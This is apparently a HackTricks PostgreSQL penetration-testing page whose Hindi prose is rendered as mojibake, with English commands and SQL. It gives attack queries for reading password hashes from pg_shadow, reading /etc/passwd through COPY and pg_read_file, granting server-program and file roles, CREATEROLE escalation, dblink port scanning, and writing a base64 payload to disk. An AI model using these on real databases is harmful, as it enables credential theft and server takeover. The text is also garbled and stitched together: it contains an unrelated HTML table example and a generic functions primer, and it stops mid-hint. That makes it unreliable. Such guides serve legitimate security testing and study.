# 5432,5433 - рдкреЛрд╕реНрдЯрдЧреНрд░реЗрд╕рдХреНрдпреВрдПрд▓ рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрд╕рд╛рдиреА рд╕реЗ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдмрдирд╛рдПрдВ рдФрд░ рд╕рдВрдЪрд╛рд▓рд┐рдд рдХрд░реЗрдВ, рдЬреЛ рджреБрдирд┐рдпрд╛ рдХреЗ рд╕рдмрд╕реЗ рдЙрдиреНрдирдд рд╕рдореБрджрд╛рдп рдЙрдкрдХрд░рдгреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд рд╣реЛрддреЗ рд╣реИрдВред\
рдЖрдЬ рд╣реА рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдП**? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ**? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ**.
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗ рдЕрдкрдирд╛ рдпреЛрдЧрджрд╛рди рджреЗрдВ**ред

</details>

## **рдореВрд▓рднреВрдд рдЬрд╛рдирдХрд╛рд░реА**

**рдкреЛрд╕реНрдЯрдЧреНрд░реЗрд╕рдХреНрдпреВрдПрд▓** рдПрдХ рдУрдкрди рд╕реЛрд░реНрд╕ рдСрдмреНрдЬреЗрдХреНрдЯ-рд╕рдВрдмрдВрдзреА рдбреЗрдЯрд╛рдмреЗрд╕ рд╕рд┐рд╕реНрдЯрдо рд╣реИ рдЬреЛ SQL рднрд╛рд╖рд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИред

**рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкреЛрд░реНрдЯ:** 5432 рд╣реИ, рдФрд░ рдпрджрд┐ рдпрд╣ рдкреЛрд░реНрдЯ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдЙрдкрдпреЛрдЧ рдореЗрдВ рд╣реИ рддреЛ рдкреНрд░рддреАрдд рд╣реЛрддрд╛ рд╣реИ рдХрд┐ рдкреЛрд╕реНрдЯрдЧреНрд░реЗрд╕рдХреНрдпреВрдПрд▓ рдЕрдЧрд▓реЗ рдкреЛрд░реНрдЯ (рд╢рд╛рдпрдж 5433) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛ рдЬреЛ рдЙрдкрдпреЛрдЧ рдореЗрдВ рдирд╣реАрдВ рд╣реИред
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## рдХрдиреЗрдХреНрдЯ рдФрд░ рдореВрд▓ рдЬрд╛рдВрдЪ

### Connect to PostgreSQL

To connect to a PostgreSQL database, you can use the `psql` command-line tool. The syntax is as follows:

```bash
psql -h <host> -p <port> -U <username> -d <database>
```

- `<host>`: The hostname or IP address of the PostgreSQL server.
- `<port>`: The port number on which the PostgreSQL server is running (default is 5432).
- `<username>`: The username to connect to the database.
- `<database>`: The name of the database to connect to.

### Basic Enumeration

Once connected to the PostgreSQL server, you can perform basic enumeration to gather information about the database. Here are some useful commands:

- `\l`: List all databases.
- `\dt`: List all tables in the current database.
- `\du`: List all users/roles.
- `\dv`: List all views.
- `\df`: List all functions.
- `\dp`: List all permissions.

You can also use SQL queries to gather more specific information. For example:

- `SELECT version();`: Get the version of PostgreSQL.
- `SELECT current_user;`: Get the current user.
- `SELECT current_database();`: Get the current database.

Remember to always check for misconfigurations, weak credentials, and other vulnerabilities during the enumeration phase.
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
{% hint style="warning" %}
рдпрджрд┐ рдЖрдк **`\list`** рдЪрд▓рд╛рддреЗ рд╕рдордп рдЖрдкрдХреЛ рдПрдХ рдбреЗрдЯрд╛рдмреЗрд╕ рдорд┐рд▓рддрд╛ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдирд╛рдо **`rdsadmin`** рд╣реИ, рддреЛ рдЖрдк рдЬрд╛рди рдЬрд╛рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдк рдПрдХ **AWS postgresql рдбреЗрдЯрд╛рдмреЗрд╕** рдХреЗ рдЕрдВрджрд░ рд╣реИрдВред
{% endhint %}

**PostgreSQL рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рджреБрд░реБрдкрдпреЛрдЧ рдХреИрд╕реЗ рдХрд░реЗрдВ** рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ:

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/" %}
[postgresql-injection](../pentesting-web/sql-injection/postgresql-injection/)
{% endcontent-ref %}

## рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЧрдгрдирд╛
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕**](../generic-methodologies-and-resources/brute-force.md#postgresql)

### **рдкреЛрд░реНрдЯ рд╕реНрдХреИрдирд┐рдВрдЧ**

[**рдЗрд╕ рд╢реЛрдз**](https://www.exploit-db.com/papers/13084) рдХреЗ рдЕрдиреБрд╕рд╛рд░, рдЬрдм рдХреЛрдИ рдХрдиреЗрдХреНрд╢рди рдкреНрд░рдпрд╛рд╕ рд╡рд┐рдлрд▓ рд╣реЛрддрд╛ рд╣реИ, `dblink` рдПрдХ `sqlclient_unable_to_establish_sqlconnection` рдЕрдкрд╡рд╛рдж рдлреЗрдВрдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рддреНрд░реБрдЯрд┐ рдХрд╛ рд╡реНрдпрд╛рдЦреНрдпрд╛рди рд╢рд╛рдорд┐рд▓ рд╣реЛрддрд╛ рд╣реИред рдЗрди рд╡рд┐рд╡рд░рдгреЛрдВ рдХреЗ рдЙрджрд╛рд╣рд░рдг рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рд╣реИрдВред
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
* рд╣реЛрд╕реНрдЯ рдиреАрдЪреЗ рд╣реИ

`рд╡рд┐рд╡рд░рдг: рд╕рд░реНрд╡рд░ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдореЗрдВ рдЕрд╕рдорд░реНрде: рд╣реЛрд╕реНрдЯ "1.2.3.4" рдкрд░ рд╕рд░реНрд╡рд░ рдЪрд▓ рд░рд╣рд╛ рд╣реИ рдФрд░ рдкреЛрд░реНрдЯ 5678 рдкрд░ TCP/IP рдХрдиреЗрдХреНрд╢рди рд╕реНрд╡реАрдХрд╛рд░ рдХрд░ рд░рд╣рд╛ рд╣реИ?`

* рдкреЛрд░реНрдЯ рдмрдВрдж рд╣реИ
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
* рдкреЛрд░реНрдЯ рдЦреБрд▓рд╛ рд╣реИ
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
рдпрд╛
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
* рдкреЛрд░реНрдЯ рдЦреБрд▓рд╛ рд╣реИ рдпрд╛ рдлрд╝рд┐рд▓реНрдЯрд░ рд╣реИ
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
рджреБрд░реНрднрд╛рдЧреНрдпрд╡рд╢, PL/pgSQL рдлрдВрдХреНрд╢рди рдХреЗ рднреАрддрд░ рдЕрдкрд╡рд╛рдж рд╡рд┐рд╡рд░рдг рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рдХреЛрдИ рддрд░реАрдХрд╛ рдирд╣реАрдВ рд╣реИред рд▓реЗрдХрд┐рди рдпрджрд┐ рдЖрдк рд╕реАрдзреЗ PostgreSQL рд╕рд░реНрд╡рд░ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддреЛ рдЖрдк рд╡рд┐рд╡рд░рдг рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рдкреНрд░рдгрд╛рд▓реА рддрд╛рд▓рд┐рдХрд╛рдУрдВ рд╕реЗ рд╕реАрдзреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИ, рддреЛ рдкрд┐рдЫрд▓реЗ рдЦрдВрдб рдореЗрдВ рд╡рд░реНрдгрд┐рдд рд╢рдмреНрджрд╕реВрдЪреА рд╣рдорд▓рд╛ рд╕рдлрд▓ рд╕рд╛рдмрд┐рдд рд╣реЛ рд╕рдХрддреА рд╣реИред

## рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХрд╛ рдЬрд╛рдВрдЪ

### рднреВрдорд┐рдХрд╛рдПрдБ

| рднреВрдорд┐рдХрд╛ рдкреНрд░рдХрд╛рд░  |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | рднреВрдорд┐рдХрд╛ рдореЗрдВ рд╕реБрдкрд░рдпреВрдЬрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╣реЛрддреЗ рд╣реИрдВ                                                                                                                        |
| rolinherit     | рднреВрдорд┐рдХрд╛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдЙрди рднреВрдорд┐рдХрд╛рдУрдВ рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЕрдиреБрдХрд░рдг рдХрд░рддреА рд╣реИ рдЬрд┐рдирдХреЗ рд╕рджрд╕реНрдп рд╣реИ                                                                                   |
| rolcreaterole  | рднреВрдорд┐рдХрд╛ рдЕрдзрд┐рдХ рднреВрдорд┐рдХрд╛рдПрдБ рдмрдирд╛ рд╕рдХрддреА рд╣реИрдВ                                                                                                                           |
| rolcreatedb    | рднреВрдорд┐рдХрд╛ рдбреЗрдЯрд╛рдмреЗрд╕ рдмрдирд╛ рд╕рдХрддреА рд╣реИрдВ                                                                                                                            |
| rolcanlogin    | рднреВрдорд┐рдХрд╛ рд▓реЙрдЧ рдЗрди рдХрд░ рд╕рдХрддреА рд╣реИред рдЕрд░реНрдерд╛рдд, рдЗрд╕ рднреВрдорд┐рдХрд╛ рдХреЛ рдкреНрд░рд╛рдердорд┐рдХ рд╕рддреНрд░ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдкрд╣рдЪрд╛рди рдХреЗ рд░реВрдк рдореЗрдВ рджрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред                                                     |
| rolreplication | рднреВрдорд┐рдХрд╛ рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рднреВрдорд┐рдХрд╛ рд╣реИред рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рднреВрдорд┐рдХрд╛ рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рдХрдиреЗрдХреНрд╢рди рдЖрд░рдВрдн рдХрд░ рд╕рдХрддреА рд╣реИ рдФрд░ рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рд╕реНрд▓реЙрдЯ рдмрдирд╛ рд╕рдХрддреА рд╣реИрдВ рдФрд░ рд╣рдЯрд╛ рд╕рдХрддреА рд╣реИрдВред                           |
| rolconnlimit   | рд▓реЙрдЧ рдЗрди рдХрд░рдиреЗ рд╡рд╛рд▓реА рднреВрдорд┐рдХрд╛рдУрдВ рдХреЗ рд▓рд┐рдП, рдпрд╣ рдЗрд╕ рднреВрдорд┐рдХрд╛ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдП рдЧрдП рд╕рдордп рдХреЗ рд╕рд╛рде рд╕рдВрдпреБрдХреНрдд рд╕рдВрд╡рд╛рджреЛрдВ рдХреА рдЕрдзрд┐рдХрддрдо рд╕рдВрдЦреНрдпрд╛ рд╕реЗрдЯ рдХрд░рддрд╛ рд╣реИред -1 рдХрд╛ рдЕрд░реНрде рд╣реИ рдХреЛрдИ рд╕реАрдорд╛ рдирд╣реАрдВ рд╣реИред |
| rolpassword    | рдкрд╛рд╕рд╡рд░реНрдб рдирд╣реАрдВ (рд╣рдореЗрд╢рд╛ `********` рдХреЗ рд░реВрдк рдореЗрдВ рдкрдврд╝рд╛ рдЬрд╛рддрд╛ рд╣реИ)                                                                                                              |
| rolvaliduntil  | рдкрд╛рд╕рд╡рд░реНрдб рд╕рдорд╛рдкреНрддрд┐ рд╕рдордп (рдХреЗрд╡рд▓ рдкрд╛рд╕рд╡рд░реНрдб рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ); рд╕рдорд╛рдкреНрддрд┐ рди рд╣реЛрдиреЗ рдкрд░ null                                                                 |
| rolbypassrls   | рднреВрдорд┐рдХрд╛ рд╣рд░ рдкрдВрдХреНрддрд┐-рд╕реНрддрд░ рд╕реБрд░рдХреНрд╖рд╛ рдиреАрддрд┐ рдХреЛ рдЕрдирджреЗрдЦрд╛ рдХрд░рддреА рд╣реИ, рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [рдЦрдВрдб 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) рджреЗрдЦреЗрдВред |
| rolconfig      | рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рднреВрдорд┐рдХрд╛-рд╡рд┐рд╢рд┐рд╖реНрдЯ рдбрд┐рдлрд╝реЙрд▓реНрдЯ                                                                                                                      |
| oid            | рднреВрдорд┐рдХрд╛ рдХрд╛ рдЖрдИрдбреА                                                                                                                                           |

#### рджрд┐рд▓рдЪрд╕реНрдк рд╕рдореВрд╣

* рдпрджрд┐ рдЖрдк **`pg_execute_server_program`** рдХреЗ рд╕рджрд╕реНрдп рд╣реИрдВ рддреЛ рдЖрдк **рдХрд╛рд░реНрдпрдХреНрд░рдо рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ
* рдпрджрд┐ рдЖрдк **`pg_read_server_files`** рдХреЗ рд╕рджрд╕реНрдп рд╣реИрдВ рддреЛ рдЖрдк **рдлрд╝рд╛рдЗрд▓реЗрдВ рдкрдврд╝ рд╕рдХрддреЗ** рд╣реИрдВ
* рдпрджрд┐ рдЖрдк **`pg_write_server_files`** рдХреЗ рд╕рджрд╕реНрдп рд╣реИрдВ рддреЛ рдЖрдк **рдлрд╝рд╛рдЗрд▓реЗрдВ рд▓рд┐рдЦ рд╕рдХрддреЗ** рд╣реИрдВ

{% hint style="info" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ Postgres рдореЗрдВ рдПрдХ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛**, рдПрдХ **рд╕рдореВрд╣** рдФрд░ рдПрдХ **рднреВрдорд┐рдХрд╛** рдПрдХ **рд╕рдорд╛рди** рд╣реИрдВред рдпрд╣ рдХреЗрд╡рд▓ **рдЖрдк рдХреИрд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ** рдФрд░ рдпрджрд┐ рдЖрдк рдЗрд╕реЗ **рд▓реЙрдЧ рдЗрди рдХрд░рдиреЗ рджреЗрддреЗ рд╣реИрдВ** рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИред
{% endhint %}
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### рддрд╛рд▓рд┐рдХрд╛рдПрдБ

```html
<table>
  <tr>
    <th>Column 1</th>
    <th>Column 2</th>
    <th>Column 3</th>
  </tr>
  <tr>
    <td>Value 1</td>
    <td>Value 2</td>
    <td>Value 3</td>
  </tr>
  <tr>
    <td>Value 4</td>
    <td>Value 5</td>
    <td>Value 6</td>
  </tr>
</table>
```

рдпрд╣рд╛рдВ рдПрдХ рдЙрджрд╛рд╣рд░рдг рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рддреАрди рд╕реНрддрдВрднреЛрдВ рд╡рд╛рд▓реА рдПрдХ рддрд╛рд▓рд┐рдХрд╛ рд╣реИред рдкрд╣рд▓реА рдкрдВрдХреНрддрд┐ рдореЗрдВ рд╕реНрддрдВрднреЛрдВ рдХреЗ рдирд╛рдо рд╣реИрдВ рдФрд░ рдмрд╛рдХреА рдкрдВрдХреНрддрд┐рдпреЛрдВ рдореЗрдВ рдорд╛рди рд╣реИрдВред рдЖрдк рдЗрд╕ рддрд╛рд▓рд┐рдХрд╛ рдХреЛ рдЕрдкрдиреА рд╡реЗрдмрд╕рд╛рдЗрдЯ рдкрд░ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдЗрд╕реЗ рдЕрдкрдиреА рд╡реЗрдм рдкреГрд╖реНрда рдореЗрдВ рдПрдХреНрд╕рдкреЛрд░реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### рдХрд╛рд░реНрдп

Functions in PostgreSQL are named blocks of code that can be executed by calling their name. They are used to perform specific tasks and can accept parameters and return values. Functions can be created using the `CREATE FUNCTION` statement and can be called using the `SELECT` statement.

PostgreSQL supports various types of functions, including scalar functions, table functions, and window functions. Scalar functions operate on a single row and return a single value, while table functions return a set of rows. Window functions perform calculations across a set of rows and return a result for each row.

Functions can be written in various programming languages, including SQL, PL/pgSQL, PL/Python, PL/Perl, and PL/Tcl. They can be used to perform complex calculations, manipulate data, and automate tasks.

To create a function, you need to specify the function name, input parameters, return type, and the code block that defines the function's behavior. Once the function is created, you can call it by providing the necessary arguments.

Here is an example of a simple function that calculates the square of a number:

```sql
CREATE FUNCTION square(num INTEGER) RETURNS INTEGER AS $$
BEGIN
    RETURN num * num;
END;
$$ LANGUAGE plpgsql;
```

You can call this function using the `SELECT` statement:

```sql
SELECT square(5);
```

This will return the result `25`, which is the square of `5`.
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## рдлрд╝рд╛рдЗрд▓-рд╕рд┐рд╕реНрдЯрдо рдХреНрд░рд┐рдпрд╛рдПрдБ

### рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдФрд░ рдлрд╝рд╛рдЗрд▓реЗрдВ рдкрдврд╝реЗрдВ

рдЗрд╕ [**рдХрдорд┐рдЯ**](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) рд╕реЗ, **`DEFAULT_ROLE_READ_SERVER_FILES`** рд╕рдореВрд╣ (рдЬрд┐рд╕реЗ **`pg_read_server_files`** рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ) рдХреЗ рд╕рджрд╕реНрдп рдФрд░ **рд╕реБрдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХрд┐рд╕реА рднреА рдкрде рдкрд░ **`COPY`** рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЬрд╛рдВрдЪреЗрдВ `genfile.c` рдореЗрдВ `convert_and_check_filename`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
{% hint style="warning" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рдЖрдк рд╕реБрдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╣реАрдВ рд╣реИрдВ рд▓реЗрдХрд┐рди рдЖрдкрдХреЗ рдкрд╛рд╕ **CREATEROLE** рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВ, рддреЛ рдЖрдк **рдЙрд╕ рд╕рдореВрд╣ рдХреЗ рд╕рджрд╕реНрдп рдмрди рд╕рдХрддреЗ рд╣реИрдВ:**
```sql
GRANT pg_read_server_files TO username;
```
[**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реАред**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

**рдЕрдиреНрдп рдкреЛрд╕реНрдЯрдЧреНрд░реЗрд╕ рдлрдВрдХреНрд╢рди** рд╣реИрдВ рдЬрд┐рдирдХрд╛ рдЙрдкрдпреЛрдЧ **рдлрд╝рд╛рдЗрд▓ рдкрдврд╝рдиреЗ рдпрд╛ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╕реВрдЪреА рдмрдирд╛рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдХреЗрд╡рд▓ **рд╕реБрдкрд░рдпреВрдЬрд░** рдФрд░ **рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЕрдиреБрдорддрд┐рдпреЛрдВ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рд╣реА рдЗрдирдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
рдЖрдк [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html) рдореЗрдВ **рдЕрдзрд┐рдХ рдлрд╝рдВрдХреНрд╢рди** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред

### рд╕рд░рд▓ рдлрд╝рд╛рдЗрд▓ рд▓реЗрдЦрди

рдХреЗрд╡рд▓ **рд╕реБрдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдФрд░ **`pg_write_server_files`** рдХреЗ рд╕рджрд╕реНрдп рдлрд╝рд╛рдЗрд▓ рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП copy рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

{% code overflow="wrap" %}
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
{% endcode %}

{% hint style="warning" %}
